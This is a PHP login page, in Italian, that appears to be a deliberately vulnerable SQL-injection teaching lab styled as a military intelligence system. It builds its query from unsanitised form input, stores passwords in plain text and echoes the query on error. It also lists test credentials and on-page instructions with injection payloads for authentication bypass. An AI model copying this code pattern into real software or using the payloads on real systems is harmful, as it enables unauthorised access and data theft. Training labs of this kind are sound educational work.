<?php
session_start();
require_once 'db_config.php';


$error_message = '';
$login_success = false;
$user_data = null;
$all_results = [];
$debug_query = '';

if (isset($_SESSION['user_data'])) {
    $login_success = true;
    $user_data = $_SESSION['user_data'];
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $matricola = $_POST['matricola'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $query = "SELECT p.id,
                     p.matricola,
                     p.nome,
                     p.cognome,
                     p.grado_id,
                     p.livello_clearance,
                     p.reparto,
                     p.email,
                     p.note_riservate,
                     g.nome as grado_nome,
                     c.nome as clearance_nome
                     FROM personale p
                     JOIN grado_militare g ON p.grado_id = g.id
                     JOIN classificazione c ON p.livello_clearance = c.livello
                     WHERE p.matricola = '$matricola' AND p.password_hash = '$password'";
    
    $debug_query = $query;
    
    $result = execute_query($query);
    
    if ($result && count($result) > 0) {
        $login_success = true;
        $all_results = $result; // Salva TUTTI i risultati
        $user_data = $result[0]; // Primo utente per la sessione
        
        // Salva i dati utente in sessione
        $_SESSION['user_data'] = $user_data;
        
    } else {
        $error_message = "Credenziali non valide o accesso negato.\n";
    }
}

// Gestione logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: login.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Sistema</title>
    <link rel="stylesheet" href="css/common.css">
    <link rel="stylesheet" href="css/login.css">
</head>
<body>
    <div class="container">
        <h1>LOGIN</h1>
        
        <?php if ($error_message): ?>
            <div class="error-message">
                <?php echo htmlspecialchars($error_message); ?>
                <br><br>
                <?php echo htmlspecialchars($query); ?>

            </div>
        <?php endif; ?>
        
        <?php if ($login_success): ?>    
            <?php
            if (empty($all_results) && isset($_SESSION['user_data'])) {
                $all_results = [ $_SESSION['user_data'] ];
            }
            ?>       
            <?php foreach ($all_results as $index => $user): ?>
                <div class="success-box" style="margin-bottom: 20px;">
                    <h2 style="color: #0f0; text-align: center; margin-bottom: 15px;">
                        ACCESSO AUTORIZZATO
                    </h2>
                    
                    <div class="user-info">
                        <div class="info-item">
                            <div class="info-label">MATRICOLA</div>
                            <div class="info-value"><?php echo htmlspecialchars($user['matricola']); ?></div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">NOME COMPLETO</div>
                            <div class="info-value">
                                <?php echo htmlspecialchars($user['nome'] . ' ' . $user['cognome']); ?>
                            </div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">GRADO</div>
                            <div class="info-value"><?php echo htmlspecialchars($user['grado_nome']); ?></div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">REPARTO</div>
                            <div class="info-value"><?php echo htmlspecialchars($user['reparto'] ?? 'N/A'); ?></div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">EMAIL</div>
                            <div class="info-value"><?php echo htmlspecialchars($user['email'] ?? 'N/A'); ?></div>
                        </div>
                        
                        <div class="info-item">
                            <div class="info-label">LIVELLO CLEARANCE</div>
                            <div class="info-value"><?php echo htmlspecialchars($user['clearance_nome']); ?></div>
                        </div>
                        
                        <?php if (!empty($user['note_riservate'])): ?>
                            <div class="info-item">
                                <div class="info-label">NOTE RISERVATE</div>
                                <div class="info-value" style="color: #000;">
                                    <?php echo htmlspecialchars($user['note_riservate']); ?>
                                </div>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            <?php endforeach; ?>

            <?php if ($user_data['grado_id'] > 0): ?>
                <div class="menu-grid">
                    <a href="communications.php" class="menu-item">                        
                        <div class="menu-title">Comunicazioni</div>
                        <div class="menu-desc">Intercettazioni decriptate</div>
                    </a>
                    <?php if ($user_data['grado_id'] > 4): ?>
                        <a href="search_targets.php" class="menu-item">
                            <div class="menu-title">Bersagli</div>
                            <div class="menu-desc">Soggetti sotto sorveglianza</div>
                        </a>
                        <a href="search_operations.php" class="menu-item">
                            <div class="menu-title">Operazioni</div>
                            <div class="menu-desc">Missioni intelligence attive</div>
                        </a>

                        <?php if ($user_data['grado_id'] > 8): ?>
                            <a href="keys.php" class="menu-item">
                                <div class="menu-title">Chiavi Crypto</div>
                                <div class="menu-desc">Sistema crittografico</div>
                            </a>
                        <?php endif; ?>     
                    <?php endif; ?> 
                </div>
            <?php endif; ?> 
            <div class="bottom-buttons">
                <a href="index.php" class="btn1 left"><- Menu Principale</a>
                <a href="login.php?logout=1" class="btn2 right">Logout</a>
            </div>   
        <?php else: ?>
            <form method="POST" class="login-form">
                <div class="form-group">
                    <label for="matricola">MATRICOLA</label>
                    <input type="text" id="matricola" name="matricola" 
                           placeholder="Inserisci matricola..." required>
                </div>
                
                <div class="form-group">
                    <label for="password">PASSWORD</label>
                    <input type="password" id="password" name="password" 
                           placeholder="Inserisci password..." required>
                </div>
                
                <input type="submit" value="ACCEDI AL SISTEMA">
            </form>
            
            <div class="test-credentials">
                <h4>Credenziali Valide:</h4>
                <code>Matricola: M001 | Password: pass1 (grado 1)<br></code>
                <code>Matricola: M005 | Password: pass5 (grado 5)<br></code>
                <code>Matricola: M010 | Password: pass10 (grado 10)</code>
            </div>
            <div class="hints">
                <h3>ISTRUZIONI PER ATTACCO SQL INJECTION</h3>

                <strong>1. Mostra la Query:</strong>
                <code>Matricola: qualsiasi<br>Password: qualsiasi</code>
                
                <strong>2. Bypass autenticazione e scoperta di tutti gli utenti(Tautologia + Commento):</strong>
                <code>Matricola: ' OR '1'='1' --<br>Password: qualsiasi</code>

                <strong> (opzionale) Bypass autenticazione con matricola di grado piu alto(Filtering):</strong>
                <code>Matricola: ' OR grado_id=(SELECT MAX(grado_id) FROM personale) --<br>Password: qualsiasi</code>

                <strong>3. Bypass autenticazione della matricola scelta(Commento):</strong>
                <code>Matricola:M010' --<br>Password: qualsiasi</code>
                
            </div>

            <div class="bottom-buttons">
                <a href="index.php" class="btn1 left"><- Menu Principale</a>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>